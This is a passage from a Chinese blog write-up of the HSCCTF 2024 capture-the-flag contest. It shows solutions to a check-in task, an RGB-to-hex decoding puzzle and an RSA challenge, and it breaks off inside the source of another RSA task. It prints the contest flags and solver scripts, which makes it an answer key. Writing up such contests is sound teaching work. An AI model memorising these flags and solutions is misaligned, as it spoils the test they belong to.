<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,minimal-ui"><meta name="renderer" content="webkit"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no,email=no,adress=no"><meta name="theme-color" content="#000000"><meta http-equiv="window-target" content="_top"><title>HSCCTF 2024 | Lazzaro</title><meta name="description" content="​     本届HSCCTF 2024是由中龙技术联合社会战队红客突击队（HSCSEC）举办。 本次比赛将采用在线网络安全夺旗挑战赛的形式，涵盖WEB、CRYPTO、MISC、PWN、REVERSE、OSINT等主流方向，并面向全球开放。 Rank: 1  ​     CHECKINCHECKIN 关注公众号：#红客突击队&#x2F;#中龙红客突击队，并发送hscctf2024以获取flag  分别给两个公"><meta property="og:type" content="article"><meta property="og:title" content="HSCCTF 2024"><meta property="og:url" content="https://lazzzaro.github.io/2024/03/11/match-HSCCTF-2024/index.html"><meta property="og:site_name" content="Lazzaro"><meta property="og:description" content="​     本届HSCCTF 2024是由中龙技术联合社会战队红客突击队（HSCSEC）举办。 本次比赛将采用在线网络安全夺旗挑战赛的形式，涵盖WEB、CRYPTO、MISC、PWN、REVERSE、OSINT等主流方向，并面向全球开放。 Rank: 1  ​     CHECKINCHECKIN 关注公众号：#红客突击队&#x2F;#中龙红客突击队，并发送hscctf2024以获取flag  分别给两个公"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://lazzzaro.github.io/2024/03/11/match-HSCCTF-2024/flag.jpg"><meta property="article:published_time" content="2024-03-11T03:28:02.000Z"><meta property="article:modified_time" content="2024-03-14T12:47:15.999Z"><meta property="article:author" content="Lazzaro"><meta property="article:tag" content="2024赛"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://lazzzaro.github.io/2024/03/11/match-HSCCTF-2024/flag.jpg"><link rel="canonical" href="https://lazzzaro.github.io/2024/03/11/match-HSCCTF-2024/index.html"><link rel="alternate" href="/atom.xml" title="Lazzaro" type="application/atom+xml"><link rel="icon" href="/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link href="https://cdn.jsdelivr.net/npm/katex@0.9.0/dist/katex.min.css" rel="stylesheet"><script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script><script>LA.init({id:"3Ft5J9t2Jl0eb5Zr",ck:"3Ft5J9t2Jl0eb5Zr",hashMode:!0})</script><meta name="generator" content="Hexo 7.0.0"></head><body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="slimContent"><div class="navbar-header"><div class="profile-block text-center"><a id="avatar" href="https://github.com/Lazzzaro" target="_blank"><img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200"></a><h2 id="name" class="hidden-xs hidden-sm">Lazzaro</h2><h3 id="title" class="hidden-xs hidden-sm hidden-md">CTF弱鸡自进阶</h3><small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> flag{}___Orz</small></div><div class="search" id="search-form-wrap"><form class="search-form sidebar-form"><div class="input-group"><input type="text" class="search-form-input form-control" placeholder="搜索"> <span class="input-group-btn"><button type="submit" class="search-form-submit btn btn-flat" onclick="return!1"><i class="icon icon-search"></i></button></span></div></form><div class="ins-search"><div class="ins-search-mask"></div><div class="ins-search-container"><div class="ins-input-wrapper"><input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech> <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button></div><div class="ins-section-wrapper"><div class="ins-section-container"></div></div></div></div></div><button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false"><span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span></button></div><nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation"><ul class="nav navbar-nav main-nav menu-highlight"><li class="menu-item menu-item-home"><a href="/."><i class="icon icon-home-fill"></i> <span class="menu-title">总览</span></a></li><li class="menu-item menu-item-archives"><a href="/archives"><i class="icon icon-archives-fill"></i> <span class="menu-title">汇总</span></a></li><li class="menu-item menu-item-categories"><a href="/categories"><i class="icon icon-folder"></i> <span class="menu-title">类别</span></a></li><li class="menu-item menu-item-tags"><a href="/tags"><i class="icon icon-tags"></i> <span class="menu-title">关键词</span></a></li><li class="menu-item menu-item-guestbook"><a href="/guestbook"><i class="icon"></i> <span class="menu-title">来留个言 👉👉👉</span></a></li></ul><ul class="social-links"><li><a href="https://github.com/Lazzzaro" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li></ul></nav></div></header><aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><div class="widget"><h3 class="widget-title">类别</h3><div class="widget-body"><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/crypto/">crypto</a><span class="category-list-count">16</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/match/">match</a><span class="category-list-count">50</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/misc/">misc</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/other/">other</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/reverse/">reverse</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a><span class="category-list-count">17</span></li></ul></div></div><div class="widget"><h3 class="widget-title">关键词云</h3><div class="widget-body tagcloud"><a href="/tags/2020%E8%B5%9B/" style="font-size:14px">2020赛</a> <a href="/tags/2021%E8%B5%9B/" style="font-size:13.86px">2021赛</a> <a href="/tags/2022%E8%B5%9B/" style="font-size:13.57px">2022赛</a> <a href="/tags/2023%E8%B5%9B/" style="font-size:13.71px">2023赛</a> <a href="/tags/2024%E8%B5%9B/" style="font-size:13.29px">2024赛</a> <a href="/tags/2025%E8%B5%9B/" style="font-size:13px">2025赛</a> <a href="/tags/AES/" style="font-size:13px">AES</a> <a href="/tags/Android/" style="font-size:13px">Android</a> <a href="/tags/Bash/" style="font-size:13px">Bash</a> <a href="/tags/CMS/" style="font-size:13px">CMS</a> <a href="/tags/CSRF/" style="font-size:13px">CSRF</a> <a href="/tags/DES/" style="font-size:13px">DES</a> <a href="/tags/ECC/" style="font-size:13px">ECC</a> <a href="/tags/IDA/" style="font-size:13px">IDA</a> <a href="/tags/JWT/" style="font-size:13px">JWT</a> <a href="/tags/Java/" style="font-size:13.14px">Java</a> <a href="/tags/Linux/" style="font-size:13px">Linux</a> <a href="/tags/OT/" style="font-size:13px">OT</a> <a href="/tags/PHP/" style="font-size:13.29px">PHP</a> <a href="/tags/RCE/" style="font-size:13px">RCE</a> <a href="/tags/RSA/" style="font-size:13.14px">RSA</a> <a href="/tags/SQL/" style="font-size:13px">SQL</a> <a href="/tags/SSRF/" style="font-size:13px">SSRF</a> <a href="/tags/SSTI/" style="font-size:13px">SSTI</a> <a href="/tags/Sage/" style="font-size:13px">Sage</a> <a href="/tags/USB/" style="font-size:13px">USB</a> <a href="/tags/Unity/" style="font-size:13px">Unity</a> <a href="/tags/WebAssembly/" style="font-size:13px">WebAssembly</a> <a href="/tags/XSS/" style="font-size:13px">XSS</a> <a href="/tags/XXE/" style="font-size:13px">XXE</a> <a href="/tags/angr/" style="font-size:13px">angr</a> <a href="/tags/fuzz/" style="font-size:13px">fuzz</a> <a href="/tags/gmpy2/" style="font-size:13px">gmpy2</a> <a href="/tags/hash/" style="font-size:13px">hash</a> <a href="/tags/js/" style="font-size:13px">js</a> <a href="/tags/node-js/" style="font-size:13.14px">node.js</a> <a href="/tags/pwntools/" style="font-size:13px">pwntools</a> <a href="/tags/python/" style="font-size:13.43px">python</a> <a href="/tags/wasm/" style="font-size:13px">wasm</a> <a href="/tags/z3/" style="font-size:13px">z3</a> <a href="/tags/%E5%86%85%E7%BD%91/" style="font-size:13px">内网</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size:13px">反序列化</a> <a href="/tags/%E5%8F%8D%E7%BC%96%E8%AF%91/" style="font-size:13px">反编译</a> <a href="/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/" style="font-size:13px">反调试</a> <a href="/tags/%E5%8F%96%E8%AF%81/" style="font-size:13px">取证</a> <a href="/tags/%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/" style="font-size:13px">后量子密码</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/" style="font-size:13px">命令行</a> <a href="/tags/%E5%9B%BE%E5%83%8F/" style="font-size:13px">图像</a> <a href="/tags/%E5%9D%97%E5%AF%86%E7%A0%81/" style="font-size:13px">块密码</a> <a href="/tags/%E5%A0%86/" style="font-size:13px">堆</a> <a href="/tags/%E5%AF%86%E7%A0%81/" style="font-size:13.14px">密码</a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size:13px">提权</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size:13px">文件上传</a> <a href="/tags/%E6%9B%B2%E7%BA%BF/" style="font-size:13px">曲线</a> <a href="/tags/%E6%A0%88/" style="font-size:13px">栈</a> <a href="/tags/%E6%A0%BC%E5%AF%86%E7%A0%81/" style="font-size:13px">格密码</a> <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" style="font-size:13px">格式化字符串</a> <a href="/tags/%E6%B3%A8%E5%85%A5/" style="font-size:13px">注入</a> <a href="/tags/%E6%B5%81%E5%AF%86%E7%A0%81/" style="font-size:13px">流密码</a> <a href="/tags/%E6%B5%81%E9%87%8F/" style="font-size:13px">流量</a> <a href="/tags/%E6%B7%B7%E6%B7%86/" style="font-size:13px">混淆</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size:13px">渗透</a> <a href="/tags/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/" style="font-size:13px">离散对数</a> <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size:13.14px">算法</a> <a href="/tags/%E7%BB%95%E8%BF%87/" style="font-size:13.43px">绕过</a> <a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size:13px">编码</a> <a href="/tags/%E8%84%9A%E6%9C%AC/" style="font-size:13.14px">脚本</a> <a href="/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/" style="font-size:13px">自动化</a> <a href="/tags/%E9%80%83%E9%80%B8/" style="font-size:13px">逃逸</a> <a href="/tags/%E9%9A%90%E5%86%99/" style="font-size:13.29px">隐写</a></div></div><div class="widget"><h3 class="widget-title">汇总</h3><div class="widget-body"><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/08/">八月 2025</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/06/">六月 2025</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">十二月 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">十一月 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">三月 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">十一月 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">九月 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">五月 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">二月 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">一月 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">十二月 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">十一月 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">九月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">七月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">六月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">五月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">二月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">一月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">十二月 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">十一月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">九月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">八月 2021</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">四月 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">二月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">十二月 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">十一月 2020</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">十月 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">九月 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">八月 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">七月 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">六月 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a><span class="archive-list-count">24</span></li></ul></div></div></div></aside><aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><nav id="toc" class="article-toc"><h3 class="toc-title">文章目录</h3><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CHECKIN"><span class="toc-number">1.</span> <span class="toc-text">CHECKIN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CHECKIN-1"><span class="toc-number">1.1.</span> <span class="toc-text">CHECKIN</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">2.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%D0%BA%D0%B0%D1%82%D1%8E%D1%88%D0%B0"><span class="toc-number">2.1.</span> <span class="toc-text">катюша</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRYPTO"><span class="toc-number">3.</span> <span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FUNNY"><span class="toc-number">3.1.</span> <span class="toc-text">FUNNY</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#REAL-SIGN-IN"><span class="toc-number">3.2.</span> <span class="toc-text">REAL_SIGN_IN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EZ-MATH"><span class="toc-number">3.3.</span> <span class="toc-text">EZ_MATH</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SIGN-IN"><span class="toc-number">3.4.</span> <span class="toc-text">SIGN_IN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MIXED"><span class="toc-number">3.5.</span> <span class="toc-text">MIXED</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#YOUQU"><span class="toc-number">3.6.</span> <span class="toc-text">YOUQU</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RSATEST"><span class="toc-number">3.7.</span> <span class="toc-text">RSATEST</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#STAR-CHASING-DIARY"><span class="toc-number">3.8.</span> <span class="toc-text">STAR_CHASING_DIARY</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#REVERSE"><span class="toc-number">4.</span> <span class="toc-text">REVERSE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TEA"><span class="toc-number">4.1.</span> <span class="toc-text">TEA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ROULETTE"><span class="toc-number">4.2.</span> <span class="toc-text">ROULETTE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#THE-WOLF-SONG"><span class="toc-number">4.3.</span> <span class="toc-text">THE_WOLF_SONG</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NO-PY"><span class="toc-number">4.4.</span> <span class="toc-text">NO_PY</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-number">5.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#STACK"><span class="toc-number">5.1.</span> <span class="toc-text">STACK</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PWN01"><span class="toc-number">5.2.</span> <span class="toc-text">PWN01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PWN02"><span class="toc-number">5.3.</span> <span class="toc-text">PWN02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GHOST"><span class="toc-number">5.4.</span> <span class="toc-text">GHOST</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">6.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CHECKIN-2"><span class="toc-number">6.1.</span> <span class="toc-text">CHECKIN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PWD"><span class="toc-number">6.2.</span> <span class="toc-text">PWD</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TMPL"><span class="toc-number">6.3.</span> <span class="toc-text">TMPL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SHIROSHORTMENSHELL"><span class="toc-number">6.4.</span> <span class="toc-text">SHIROSHORTMENSHELL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DESERIALIZATION"><span class="toc-number">6.5.</span> <span class="toc-text">DESERIALIZATION</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LOG"><span class="toc-number">6.6.</span> <span class="toc-text">LOG</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OSINT"><span class="toc-number">7.</span> <span class="toc-text">OSINT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NICE-RIVER"><span class="toc-number">7.1.</span> <span class="toc-text">NICE_RIVER</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%D0%B3%D0%BE%D1%80%D0%BE%D0%B4"><span class="toc-number">7.2.</span> <span class="toc-text">город</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CAR"><span class="toc-number">7.3.</span> <span class="toc-text">CAR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FLAG"><span class="toc-number">7.4.</span> <span class="toc-text">FLAG</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CITY"><span class="toc-number">7.5.</span> <span class="toc-text">CITY</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BLOCKCHAIN"><span class="toc-number">8.</span> <span class="toc-text">BLOCKCHAIN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BONUS"><span class="toc-number">8.1.</span> <span class="toc-text">BONUS</span></a></li></ol></li></ol></nav></div></aside><main class="main" role="main"><div class="content"><article id="post-match-HSCCTF-2024" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting"><div class="article-header"><h1 class="article-title" itemprop="name">HSCCTF 2024</h1><div class="article-meta"><span class="article-date"><i class="icon icon-calendar-check"></i> <a href="/2024/03/11/match-HSCCTF-2024/" class="article-date"><time datetime="2024-03-11T03:28:02.000Z" itemprop="datePublished">2024-03-11</time> </a></span><span class="article-category"><i class="icon icon-folder"></i> <a class="article-category-link" href="/categories/match/">match</a> </span><span class="article-tag"><i class="icon icon-tags"></i> <a class="article-tag-link-link" href="/tags/2024%E8%B5%9B/" rel="tag">2024赛</a> </span><span class="article-read hidden-xs"><i class="icon icon-eye-fill" aria-hidden="true"></i> <span id="/2024/03/11/match-HSCCTF-2024/" class="leancloud_visitors" data-flag-title="HSCCTF 2024"><span class="leancloud-visitors-count">∞</span> </span></span><span class="post-comment"><i class="icon icon-comment"></i> <a href="/2024/03/11/match-HSCCTF-2024/#comments" class="article-comment-link">评论</a></span></div></div><div class="article-entry marked-body" itemprop="articleBody"><p>​</p><p>本届HSCCTF 2024是由中龙技术联合社会战队红客突击队（HSCSEC）举办。 本次比赛将采用在线网络安全夺旗挑战赛的形式，涵盖WEB、CRYPTO、MISC、PWN、REVERSE、OSINT等主流方向，并面向全球开放。</p><p><strong>Rank: 1</strong></p><hr><p>​</p><h2 id="CHECKIN"><a href="#CHECKIN" class="headerlink" title="CHECKIN"></a>CHECKIN</h2><h3 id="CHECKIN-1"><a href="#CHECKIN-1" class="headerlink" title="CHECKIN"></a>CHECKIN</h3><blockquote><p>关注公众号：#红客突击队/#中龙红客突击队，并发送hscctf2024以获取flag</p></blockquote><p>分别给两个公众号发hscctf2024，得到字符串拼接：<code>hscctf&#123;hscctf2O24_w3lc0me&#125;</code>。</p><p>​</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="катюша"><a href="#катюша" class="headerlink" title="катюша"></a>катюша</h3><blockquote><p>flag形式为:HSCCTF{this_is_an_example}</p></blockquote><p>查看源码，提取rgb值拼接：</p><p><code>4, 8, 5, 3, 4, 3, 4, 3, 5, 4, 4, 6, 7, 11, 5, 9, 6, 15, 7, 5, 5, 15, 6, 8, 6, 1, 7, 6, 6, 5, 5, 15, 7, 2, 6, 5, 6, 3, 6, 5, 6, 9, 7, 6, 6, 5, 6, 4, 5, 15, 7, 4, 6, 8, 6, 5, 5, 15, 6, 12, 6, 5, 7, 4, 7, 4, 6, 5, 7, 2, 5, 15, 6, 15, 6, 6, 5, 15, 4, 11, 6, 1, 7, 1, 6, 9, 7, 5, 7, 3, 6, 8, 6, 1, 7, 13</code></p><p>转换为16进制：</p><p><code>4853434354467b596f755f686176655f72656365697665645f7468655f6c65747465725f6f665f4b617169757368617d</code></p><p>转为字符串：<code>HSCCTF&#123;You_have_received_the_letter_of_Kaqiusha&#125;</code></p><p>​</p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="FUNNY"><a href="#FUNNY" class="headerlink" title="FUNNY"></a>FUNNY</h3><blockquote><p>出题人很幽默,给你p和q了直接解吧</p></blockquote><p>直接运行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">1627858721743596752497831640628357323459243890844363792736407789751577427319257708507686114456632938183775129585728892845205290864750578798354859933996208521450129131173352490118085939969385911306718129785035108056909135931322755908602656567223998858450130768625587559935064753603718657989533793373124922891077849376447589198239126291127263234784363556777780461489387706699053671315621968807065360907667815336609878856798387057891974730460404647229308105442629038061284060276648993434681114539955086828451085582033288860959729755856478065093327544217813990665326820156340461326538271909605715822484950196033809892232121330623027855970475888202583512234213349462680452400729903400494519431590431864717223438807093669836615356855072370571595889807712166659061190031457954071146645411277702230847389264989391715763232453605404095019402186331633202953693057641475300619482863265936513394341066776619336452923951439714749067348507</span></span><br><span class="line">q = <span class="number">165059760196977338034268528857897083190717585647808271832795575354736221674892279730906525407442580833042731114617534865267230347093979480666213073939602212663043286794259410177026619955285626139270678815060566416554620185859901611571955490060241822054715533030464833509114500388615748465579240918292431860839</span></span><br><span class="line">c = <span class="number">209347444484196477254668267578954904181293909211985372842733666165076889646025992007884927283300662833989678431462547742385291078285045060028956748455410812196305788814280968487973559115983082461315009316488143477261307107939530267533197821947240438534411830018967506368459544025037634267899970815198992392565948727381322854560823769432552779881938316107779842525092269591932257206582810678457433166038809740255591841951300818106018061065936083887559841543250701094558114335651396741896281230175124133873529005816838785880680073159461666783649744640398010841282229366323100807220116460976549981263966530038289223576133865992894885483308732021144420507955669760623032114718333853671281281221009397028372653797668774820725717817362383394165014402977767667433542733963298092312930702496796235196487999167666133884266829605503363510544384236303968829214389757297563873395131798724306227675722494797069994655456021649231626359765579028950908065367760981736933167557841586896807116262630848742514005606289980676609588756946993271763119859088002784499062149533167332388600036550273743940503131248513795389688869470432261503038708892320267815658450917855334244502333938120781251564676408212996623419957317150267768978807968208353379334556945</span></span><br><span class="line"></span><br><span class="line">d = inverse(<span class="number">65537</span>, q - <span class="number">1</span>)</span><br><span class="line">m = powmod(c, d, q)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment">#HSCCTF&#123;xin_nian_hao_ya&#125;</span></span><br></pre></td></tr></table></figure><p>​</p><h3 id="REAL-SIGN-IN"><a href="#REAL-SIGN-IN" class="headerlink" title="REAL_SIGN_IN"></a>REAL_SIGN_IN</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;HSCCTF&#123;*************************&#125;&#x27;</span></span><br><span class="line">m = bytes_to_long(flag.encode())</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>):</span><br><span class="line">    p = getPrime(<span class="number">1024</span>)</span><br><span class="line">    q = getPrime(<span class="number">1024</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    c = powmod(m, e, n)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;n&quot;</span>, i, <span class="string">&quot;=&quot;</span>, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;c&quot;</span>, i, <span class="string">&quot;=&quot;</span>, c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n1 = 